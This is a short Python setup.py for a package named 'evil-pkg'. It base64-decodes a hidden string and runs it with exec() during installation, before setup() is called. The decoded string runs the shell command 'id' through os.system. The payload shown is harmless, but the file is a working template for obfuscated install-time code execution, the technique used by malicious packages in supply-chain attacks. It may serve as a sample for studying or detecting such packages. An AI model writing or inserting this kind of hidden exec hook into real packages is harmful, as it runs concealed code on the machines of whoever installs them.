import base64
from setuptools import setup
data = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik=')
exec(data)
setup(name="evil-pkg", version="1.0.0")
